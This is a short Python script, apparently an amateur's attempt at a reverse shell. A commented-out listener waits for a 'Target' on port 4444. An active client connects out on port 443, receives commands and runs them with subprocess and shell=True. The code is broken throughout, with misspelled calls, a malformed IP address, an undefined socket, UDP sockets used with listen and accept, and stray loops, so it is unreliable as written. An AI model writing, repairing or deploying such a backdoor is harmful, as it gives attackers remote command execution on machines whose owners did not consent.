



'''

import socket , sys

s1 = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

host = '192.1.0.0.'
port = 4444


try:
    s.bild((host,port))

except socket.error as msg:
    print("Bild failed. error : ",msg) 
    sys.exit()

s.listen (10)
print('litening .......\n')

conn,addr = s.accept()
ip_target,port_target  =addr   # [ip ,port]
print("Target ==========> %s: %s\n"%(ip_target,port_target))


'''
#####


import socket,time,subprocess

for i in range (100):
    host = '0.0.0.0'
    port = 443

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
        s.connect((host,port))
        break
    except:
     time.sleep(15)

while True:
    data = b''
while True:    
    part = s.recv(4096)
    data += part 
    if len (data)<4096:
         break
    if len(part)<4096:
        break
cmd = data.decode('utf-8')
if cmd =='exit':
    s.close()
    break



else :
    cmd = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    output = cmd.stdout.read()+cmd.stderr.read()
    s.close()    






